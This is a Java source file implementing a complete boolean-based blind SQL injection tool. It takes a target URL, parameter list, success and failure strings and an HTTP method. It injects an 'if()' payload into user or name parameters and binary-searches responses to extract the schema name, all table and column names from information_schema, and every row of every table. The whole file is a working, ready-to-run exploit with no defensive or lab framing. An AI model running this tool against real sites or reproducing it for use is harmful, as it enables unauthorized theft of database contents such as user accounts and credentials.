package main;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.*;
import java.util.ArrayList;
import java.util.List;

public class BlindSqlInjection {
	String URL = "";
	String successResult = "";
	String failureResult = "";
	String method = "";
	String attackString = "' and 1=if((attackQuery) constraint value,1,2) and '1=1";

	public String executeQuery(String url) throws Exception {
		java.net.URL obj;
		HttpURLConnection con;
		if ("get".equalsIgnoreCase(method)) {
			url = url.replace(" ", "%20");
			url = url.replace("'", "%27");
			obj = new URL(url);
			con = (HttpURLConnection) obj.openConnection();

		} else {
			obj = new URL(url);
			con = (HttpURLConnection) obj.openConnection();
			con.setRequestMethod("POST");
			con.setDoOutput(true);
			DataOutputStream wr = new DataOutputStream(con.getOutputStream());
			wr.writeBytes(url.split("\\?")[1]);
			wr.flush();
			wr.close();
		}

		BufferedReader in = new BufferedReader(new InputStreamReader(
				con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		return response.toString();
	}

	public int extractInformation(String attackQuery, int low, int high)
			throws Exception {
		int index = -1;
		String url = URL.replace("[Query]", attackQuery);
		while (low <= high) {
			int mid = (low + high) / 2;

			if (executeQuery(
					url.replace("constraint", "=").replace("value",
							String.valueOf(mid))).contains(successResult)) {
				index = mid;
				break;
			} else if (executeQuery(
					url.replace("constraint", ">").replace("value",
							String.valueOf(mid))).contains(successResult)) {
				low = mid + 1;
			} else {
				high = mid - 1;
			}
		}
		return index;
	}

	public int getResultLength(String query) throws Exception {
		String q = "select length((" + query + "))";

		return extractInformation(attackString.replace("attackQuery", q), 0,
				100);
	}

	public String getSchemaName() throws Exception {
		String attackQuery = "select schema()";
		int length = getResultLength(attackQuery);
		StringBuilder schemaName = new StringBuilder();
		for (int i = 1; i <= length; i++) {
			String subQuery = "select ord((select substring((" + attackQuery
					+ ")," + i + ",1)))";
			schemaName.append((char) extractInformation(
					attackString.replace("attackQuery", subQuery), 0, 127));
		}

		return schemaName.toString();
	}

	public String getContent(String attackQuery) throws Exception {
		int resultLength = getResultLength(attackQuery);
		StringBuilder tableName = new StringBuilder();
		for (int i = 1; i <= resultLength; i++) {
			String subQuery = "select ord((select substring((" + attackQuery
					+ ")," + i + ",1)))";
			tableName.append((char) extractInformation(
					attackString.replace("attackQuery", subQuery), 0, 127));
		}

		return tableName.toString();
	}

	public List<String> getTables(String schemaName) throws Exception {
		List<String> tables = new ArrayList<String>();
		String attackQuery = "select count(table_name) from information_schema.tables where table_schema='"
				+ schemaName + "'";
		int numberOfTables = extractInformation(
				attackString.replace("attackQuery", attackQuery), 0, 100);
		for (int i = 0; i < numberOfTables; i++) {
			attackQuery = "select table_name from information_schema.tables where table_schema='"
					+ schemaName + "' limit " + i + ",1";
			String tableName = getContent(attackQuery);
			tables.add(tableName);
		}
		return tables;
	}

	public List<String> getColumns(String schemaName, String tableName)
			throws Exception {
		List<String> columns = new ArrayList<String>();

		String attackQuery = "select count(column_name) from information_schema.columns where table_name='"
				+ tableName + "' and table_schema='" + schemaName + "'";
		int numberOfColumns = extractInformation(
				attackString.replace("attackQuery", attackQuery), 0, 100);
		for (int i = 0; i < numberOfColumns; i++) {
			attackQuery = "select column_name from information_schema.columns where table_name='"
					+ tableName
					+ "' and table_schema='"
					+ schemaName
					+ "' limit " + i + ",1";
			String columnName = getContent(attackQuery);
			columns.add(columnName);
		}
		return columns;
	}

	public static void main(String[] args) throws Exception {
		BlindSqlInjection inject = new BlindSqlInjection();
		StringBuilder str = new StringBuilder(args[0]);
		str.append("?");
		String[] keyVal = args[1].split(";");
		for (String s : keyVal) {
			String[] arr = s.split(",");
			if (arr[0].contains("user") || arr[0].contains("name")) {
				str.append(arr[0] + "=" + arr[1] + "[Query]");
			} else {
				str.append(arr[0] + "=" + arr[1]);
			}
			str.append("&");
		}

		inject.URL = str.toString();
		inject.successResult = args[2];
		inject.failureResult = args[3];
		inject.method = args[4];

		String schemaName = inject.getSchemaName();
		System.out.println("Schema Name: " + schemaName);
		List<String> tables = inject.getTables(schemaName);
		System.out.println("Schema has the following tables: ");
		for (String table : tables) {
			System.out.print(table + " ");
		}
		System.out.println("\n");
		for (String tableName : tables) {
			System.out.println("Content from table: " + tableName);

			int numberOfRows = inject.extractInformation(
					inject.attackString.replace("attackQuery",
							"select count(*) from " + tableName), 0, 100);
			System.out.println("Table has  " + numberOfRows + " rows");
			List<String> columns = inject.getColumns(schemaName, tableName);
			for (int i = 0; i < numberOfRows; i++) {
				for (String column : columns) {
					String attackString = "select " + column + " from "
							+ tableName + " limit " + i + ",1";
					String content = inject.getContent(attackString);
					System.out.print(content + " ");
				}
				System.out.println();

			}
			System.out.println();
		}
	}
}
